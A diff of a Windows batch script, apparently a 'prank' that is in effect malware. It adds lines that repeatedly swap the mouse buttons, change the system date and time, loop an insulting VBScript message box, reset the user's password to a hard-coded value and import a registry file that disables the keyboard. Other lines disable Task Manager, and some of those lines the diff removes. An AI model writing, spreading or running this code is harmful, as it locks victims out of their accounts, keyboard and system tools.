@@ -49,35 +49,43 @@ start notepad.exe
 RUNDLL32 USER32.DLL,SwapMouseButton
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
+time 06:06:06
+
 start notepad.exe
 
+time 06:06:06
+
 echo do>>msg.vbs
-echo Msgbox"Dumb!",0+4,"What you are">>msg.vbs
+echo Msgbox"Dumb!",0+4,"What are you">>msg.vbs
 echo loop>>msg.vbs
 start msg.vbs
+
+time 06:06:06
+
+RUNDLL32 USER32.DLL,SwapMouseButton
+
+
+time 06:06:06
 
 start notepad.exe
 
 RUNDLL32 USER32.DLL,SwapMouseButton
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
 date 22/08/2014
 time 06:06:06
+
+RUNDLL32 USER32.DLL,SwapMouseButton
 
 net user %username% *
 XDjyDR4lr0gJzhGe
 XDjyDR4lr0gJzhGe
 
 RUNDLL32 USER32.DLL,SwapMouseButton
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
 date 22/08/2014
 time 06:06:06
 
 RUNDLL32 USER32.DLL,SwapMouseButton
-
-RUNDLL32 USER32.DLL,SwapMouseButton
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
 echo Windows Registry Editor Version 5.00 > "nokeyboard.reg"
 echo [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout] >> "nokeyboard.reg"
@@ -104,17 +112,17 @@ echo e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,
 echo 00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00 >> "nokeyboard.reg"
 start "nokeyboard.reg"
 
+start notepad.exe
+
 RUNDLL32 USER32.DLL,SwapMouseButton
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
 start notepad.exe
 
-start notepad.exe 
-
 RUNDLL32 USER32.DLL,SwapMouseButton
-reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
 
 start notepad.exe
+
+RUNDLL32 USER32.DLL,SwapMouseButton
 
 @echo off
 title Rainbow Matrix
@@ -187,6 +195,16 @@ echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%ra
 color 0f
 echo %random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%%random%
 
+RUNDLL32 USER32.DLL,SwapMouseButton
+RUNDLL32 USER32.DLL,SwapMouseButton
+RUNDLL32 USER32.DLL,SwapMouseButton
+RUNDLL32 USER32.DLL,SwapMouseButton
+RUNDLL32 USER32.DLL,SwapMouseButton
+RUNDLL32 USER32.DLL,SwapMouseButton
+RUNDLL32 USER32.DLL,SwapMouseButton
+RUNDLL32 USER32.DLL,SwapMouseButton
+RUNDLL32 USER32.DLL,SwapMouseButton
+RUNDLL32 USER32.DLL,SwapMouseButton
 
 
 goto end
